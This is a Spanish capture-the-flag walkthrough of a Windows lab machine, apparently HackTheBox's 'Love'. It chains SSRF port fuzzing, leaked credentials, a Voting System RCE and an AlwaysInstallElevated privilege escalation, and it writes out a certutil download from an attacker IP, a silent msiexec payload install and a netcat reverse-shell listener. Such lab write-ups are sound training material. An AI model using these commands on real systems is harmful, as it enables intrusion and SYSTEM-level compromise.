
--- 
- Tags:
- ---- 
#### QUÉ SE EXPLOTA? 

Server Side Request Forgery **[[SSRF]]**
Exploiting Voting System
Abusing AlwaysInstallElevated (msiexec/msi file)

#### WRITE UP

##### PRIMERA FASE: Reconocimiento

Como siempre vamos a empezar nuestra fase de escaneo con la herramienta **nmap**. **El primer escaneo ya sabemos que nos sirve para descubrir todos los puertos abiertos de una maquina** para este escaneo utilizamos un **syn scan** y además escanemos los **65535** puertos. 

Una vez realizado la primer etapa **pasaremos a la segunda etapa que tiene como objetivo escanear a detalle los puertos previamente encontrados en la etapa 1**. Para este escaneo **utilizamos los scripts NSE por defecto** y además vamos utilizar el **escaneo de vesión** 

![](../imgs/Pasted image 20251204170531.png)

Usando la función de **extractPorts** podemos grepear el archivo nmap.

```bash

grep -oP '\d{1,5}/open' "$1" | awk -F'/' '{print $1}' | xargs | tr ' ' ','
```

De entrada en el puerto **80** hay un servicio **http** corriendo por lo que al inspeccionar la página con **whatweb** vemos que hay un **panel de login** 

![](../imgs/Pasted image 20251204171319.png)

También encontramos el puerto **443** abierto que corresponde al servicio **https** además vemos que en su **certificado de seguridad nos está proporcionando un subdominio** por lo que lo agregamos al **[[etc-hosts]]** junto con el dominio. 

![](../imgs/Pasted image 20251204171606.png)

En el puerto **5000** además encontramos el pŕotocolo **HTTP** corriend, sin embargo, nos dice que es un recurso restringido. 

![](../imgs/Pasted image 20251204172059.png)

El puerto **445** también estaba abierto por lo que con **smbclient** revisamos a ver si podiamos obtener mayor información pero, no obtuvimos nada. 

```bash
smbclient -L 10.10.10.239 -N 
```

![](../imgs/Pasted image 20251204172228.png)

Además con **[[crackmapexec]]** también checamos el servicio **[[SMB]]** para obtener mayor información.

![](../imgs/Pasted image 20251204172330.png)

No encontramos mayor información por lo que proseguimos a inspeccionar los servicios web corriendo, tanto por el puerto **80** como por el puerto **443**. 

**En el puerto 80 encontramos un panel de Login que dice: [[VotingSystem]]** 

![](../imgs/Pasted image 20251204172459.png)

Antes de pasar a explorar el siguiente servicio expuesto por el puerto **443** primero verificamos posibles rutas de **love.htb** para esto ocuparemos **[[GoBuster]]**

Descubrimos una cuantas rutas, pero, nada de mucho interés. 

![](../imgs/Pasted image 20251205114545.png)

**Lo único relevante es que en /admin** pide un usuario a diferencia del index. En el Index pedía un **ID**. Pasamos a investigar el subdominio encontrado en el certificado **SSL**

![](../imgs/Pasted image 20251205084944.png)

Inspeccionando la páginadel puerto **443**  vimos que tenía una sección donde a través de una URL podíamos subir archivos. **Como ya sabemos cuando nosotros como atacantes tenemos la oportunidad de inyectar URL podemos pensar primeramente en un [[SSRF]]** 

##### SEGUNDA FASE: Explotación


![](../imgs/Pasted image 20251205085510.png)

Ponemos nuestra IP par ver si el servidor nos manda una petición, y con **python3 server** levantamos el servidor que recibirá la petición.

![](../imgs/Pasted image 20251205085616.png)

Estamos recibiendo peticiones del lado del servidor lo cual nos dicta que hay **[[SSRF]]**. 
Vamos primeramente a tratar de descubrir todos los puertos internos que puedan estar disponibles. Para esto utilizaremos **[[ffuf]]** para hacer un fuzzing de puertos con la petición. 

**Primeramente con Burpsuite** interecptamos la petición para ver ocmo está formada y poderla usar para fuzzear.  **Además vemos que si apuntamos al localhost** nos devuelve lo que se muestra por el puerto **80** es decir el panel de Login de **[[VotingSystem]]**

![](../imgs/Pasted image 20251205090456.png)

**Guardamos la petición en un archivo para usarlo como request**

![](../imgs/Pasted image 20251205090607.png)

**Utilizamos [[ffuf]]** para hacer un Fuzzing **[[SSRF]]**

```bash

ffuf -request ssrf.request -request-proto http -w <(seq 0 65535)
```


**Filtramos por el *size* .**

![](../imgs/Pasted image 20251205090905.png)

```bash

ffuf -request ssrf.request -request-proto http -w <(seq 0 65535) -fs 4997
```

![](../imgs/Pasted image 20251205112943.png)

Encontramos que esos puertos están abiertos, por lo que ahora proseguimos a probarlos manualmente y ver que podemos encontrar.

**Empezaremos por el 5000** mismo puerto que previamente ya habíamos visto que estaba en estado **Forbidden** 

![](../imgs/Pasted image 20251205113303.png)

Encontramos un usuario y una contraseña. 

Por lo que proseguimos a verificar si nos ayudan a conectarnos a **[[VotingSystem]]**. Y sí, nos conectamos como adminisitradores. 

![](../imgs/Pasted image 20251205114955.png)

**Proseguimos a buscar vulnerabilidades relacionadas a [[VotingSystem]]**

![](../imgs/Pasted image 20251205115518.png)
Encontramos unas cuantas para la versión **1.0** por lo que probamos el **Authenticated RCE**. Modificamos algunos campos del script para que no tuviera errores. y lo lanzamos. **Además nos tenemos que poner en escucha**

![](../imgs/Pasted image 20251205130506.png)

Recibimos la conexión.

##### TERCERA FASE: Postexplotación - Privesc

Una vez que recibimos la conexión nos dirigiremos a **c:\windows\temp** para crear un directorio de trabajo y poder escalar privilegios. 

**Dentro del directorio creado** descargaremos **[[WinPeas]]** 

```cmd

certutil.exe -f -urlcache -split http://10.10.16.3/winPEASx64.exe winpeas.exe
```

una vez descargado el archivo, proseguiremos a lanzar **[[WinPeas]]**

**Encontramos [[AlwaysInstallElevated]]** configurado con permiso **1** por lo que es vulnerable a escalar privilegios.

![](../imgs/Pasted image 20251205131916.png)

**Creamos el ejecutable [[msi]] con [[Msfvenom]]** 

![](../imgs/Pasted image 20251205134454.png)

Lo instalamos del lado de la victima y nos ponemos en escucha.

```cmd 

msiexec /quiet /qn /i rav.msi
```

```bash
rlwrap nc -lvnp 443
```


![](../imgs/Pasted image 20251205134606.png)

Somos **Authority system**


